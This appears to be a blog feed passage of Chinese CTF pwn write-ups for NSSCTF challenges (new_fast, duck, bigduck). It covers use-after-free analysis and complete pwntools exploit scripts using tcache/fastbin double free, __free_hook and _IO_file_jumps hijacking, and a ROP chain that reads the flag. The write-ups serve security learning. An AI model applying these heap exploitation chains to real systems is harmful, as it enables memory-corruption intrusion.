    <content type="html"><![CDATA[<h3 id="NSS小记1"><a href="#NSS小记1" class="headerlink" title="NSS小记1"></a>NSS小记1</h3><p>记几道NSSCTF上面的题目</p><h3 id="new-fast"><a href="#new-fast" class="headerlink" title="new_fast"></a>new_fast</h3><h4 id="题目保护情况（保护全开）"><a href="#题目保护情况（保护全开）" class="headerlink" title="题目保护情况（保护全开）"></a>题目保护情况（保护全开）</h4><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814142434765.png" alt="image-20240814142434765"></p><h4 id="64位ida逆向看看"><a href="#64位ida逆向看看" class="headerlink" title="64位ida逆向看看"></a>64位ida逆向看看</h4><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814142552613.png" alt="image-20240814142552613"></p><p>3个功能，add,show，和delete</p><p>我们重点看看delete</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814142858577.png" alt="image-20240814142858577"></p><p>存在UAF漏洞</p><p>add函数最多不能申请堆块大小超过0xff，数量是0x13，puts有00截断</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>程序libc是2.31的存在tcachebin机制，但是因为存在UAF，所以可以delete7个堆块把tcachebin填满，然后剩下堆块进入unsottbin 泄露libc，再次申请堆块进入fastbin，进行doublefree fastbin attack，但是后来发现，当tcachebin链表为空时，fastbin中有2个及以上的堆块的时候，会进入到tcachebin 堆块，这样就可以打tcachebin 劫持free_hook了</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,27334)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#unsortbin</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>) <span class="hljs-comment">#防止合并</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br><br>delete(<span class="hljs-number">7</span>)<br><br>show(<span class="hljs-number">7</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> -<span class="hljs-number">0x10</span> -libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>show(<span class="hljs-number">1</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2a0</span><br>success(<span class="hljs-string">&#x27;heap_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">9</span>)  <span class="hljs-comment">#fastbin double free</span><br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,p64(free_hook)) <span class="hljs-comment"># tcachebin attack</span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x60</span>,p64(system))<br><br>delete(<span class="hljs-number">8</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h3><h4 id="题目保护情况（保护全开）-1"><a href="#题目保护情况（保护全开）-1" class="headerlink" title="题目保护情况（保护全开）"></a>题目保护情况（保护全开）</h4><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814144231565.png" alt="image-20240814144231565"></p><h4 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h4><p>功能很全，有add，del，show，edit</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814144624671.png" alt="image-20240814144624671"></p><p>del同样存在UAF</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814144704501.png" alt="image-20240814144704501"></p><p>add申请堆块固定</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814144731089.png" alt="image-20240814144731089"></p><p>show，调用puts存在截断</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814144854869.png" alt="image-20240814144854869"></p><p>edit函数</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814144918022.png" alt="image-20240814144918022"></p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>本地libc版本是2.34版本，自2.31版本之后引用了fd，bk指针加密，加密方式 fd  ^ heap &gt;&gt; 12</p><p>泄露libc地址的话还是可以通过填满tcachebin的方式获取</p><p>因为2.34libc不存在malloc_hook 和free_hook等这些钩子，但是程序调用了puts，puts最后会调用__SI_IO_new_file_xsputn_12</p><p>然后   SI_IO_new_file_xsputn_12调用   __SI_IO_new_file_overflow_8，因此我们劫持 _IO_file_jumps 来劫持   _IO_new_file_overflow最终拿到shell</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814145526579.png" alt="image-20240814145526579"></p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814145615464.png" alt="image-20240814145615464"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./duck&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28914)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>success(<span class="hljs-string">&#x27;read---&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add() <span class="hljs-comment">#0 - 6</span><br><br>add() <span class="hljs-comment">#7</span><br>add() <span class="hljs-comment">#8</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1f2cc0</span><br>success(<span class="hljs-string">&quot;libc_base----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>_IO_file_jumps = libc_base  + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>success(<span class="hljs-string">&quot;_IO_file_jumps----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(_IO_file_jumps))<br>one = libc_base + <span class="hljs-number">0xda864</span><br><br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>success(<span class="hljs-string">&quot;heap_base-----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add()<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,p64((heap_base &gt;&gt; <span class="hljs-number">12</span>) ^ _IO_file_jumps) + p64(<span class="hljs-number">0</span>))<br><br>add() <span class="hljs-comment">#14</span><br>add() <span class="hljs-comment">#15</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(one)<br>gdb.attach(io)<br>edit(<span class="hljs-number">15</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h3><h4 id="程序保护情况（保护全开）"><a href="#程序保护情况（保护全开）" class="headerlink" title="程序保护情况（保护全开）"></a>程序保护情况（保护全开）</h4><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814150140667.png" alt="image-20240814150140667"></p><p>程序开了沙箱考虑orw</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814150434147.png" alt="image-20240814150434147"></p><h4 id="64位ida逆向-1"><a href="#64位ida逆向-1" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h4><p>跟duck很像</p><p><img src="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/image-20240814150218589.png" alt="image-20240814150218589"></p><p>那么函数就不再分析了，唯一的区别这个libc是2.33的存在钩子什么的，但是开了沙箱不好劫持</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>我这题的做法是通过UAF，来double free 劫持 tcache_ptheread_struct结构体，进而控制tcachebin，这样就可以劫持到栈上，劫持返回地址来打ROP，但是要注意，2.33的 tcache_ptheread_struct结构和2.27不一样，2.33大小是0x290，每个链表长度占2个字节，</p><p>思路就是先泄露heap地址，劫持 tcache_ptheread_struct来泄露libc地址，然后得到environ地址，进而打印出栈上的地址，然后还是通过劫持 tcache_ptheread_struct结构体来申请堆块到栈上，读取flag</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./bigduck&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28273</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    add()<br><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x10</span><br>success(<span class="hljs-string">&quot;heap_base----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>key = heap_base &gt;&gt; <span class="hljs-number">12</span><br><br>payload = p64((heap_base+<span class="hljs-number">0x10</span>) ^ key)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">16</span>,payload+p64(<span class="hljs-number">0</span>))<br><br>add() <span class="hljs-comment">#3</span><br>add() <span class="hljs-comment">#4</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x07\x00&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x10&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>show(<span class="hljs-number">3</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x10</span> - <span class="hljs-number">96</span> -<span class="hljs-number">0x10</span> -libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-built_in">open</span> = libc.sym[<span class="hljs-string">&quot;open&quot;</span>] + libc_base<br>read = libc.sym[<span class="hljs-string">&quot;read&quot;</span>] + libc_base<br>write = libc.sym[<span class="hljs-string">&quot;write&quot;</span>] + libc_base<br>environ = libc.sym[<span class="hljs-string">&quot;environ&quot;</span>] + libc_base<br><br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x07\x00&#x27;</span> *<span class="hljs-number">0x40</span> + p64(environ) * <span class="hljs-number">0x10</span><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>,payload)<br><br>add() <span class="hljs-comment">#5</span><br>show(<span class="hljs-number">5</span>)<br>io.recv(<span class="hljs-number">1</span>)<br>fake_stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x138</span><br>success(<span class="hljs-string">&quot;fake_stack----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(fake_stack))<br><br>payload = <span class="hljs-string">b&#x27;\x07\x00&#x27;</span> *<span class="hljs-number">0x40</span> + p64(fake_stack) * <span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>,payload)<br><br>add() <span class="hljs-comment">#6</span><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span> <span class="hljs-comment">#: pop rdi; ret; </span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span> <span class="hljs-comment">#: pop rsi; ret; </span><br>pop_rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span> <span class="hljs-comment">#: pop rdx; ret; </span><br><br>payload = <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(pop_rdi) + p64(fake_stack) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>)+ p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(fake_stack + <span class="hljs-number">0x100</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(fake_stack + <span class="hljs-number">0x100</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(write)<br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x100</span>,payload)<br><br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PWN！</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次IO_FILE结构体attack</title>
    <link href="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/"/>
    <url>/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/</url>
    
    <content type="html"><![CDATA[<h3 id="记一次IO-FILE结构体attack"><a href="#记一次IO-FILE结构体attack" class="headerlink" title="记一次IO_FILE结构体attack"></a><strong>记一次IO_FILE结构体attack</strong></h3><p>平常做题的时候有没有注意到bss段上的这几个数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020</span>C0 _bss            segment para public <span class="hljs-string">&#x27;BSS&#x27;</span> use64<br>.bss:<span class="hljs-number">00000000006020</span>C0                 assume cs:_bss<br>.bss:<span class="hljs-number">00000000006020</span>C0                 ;org <span 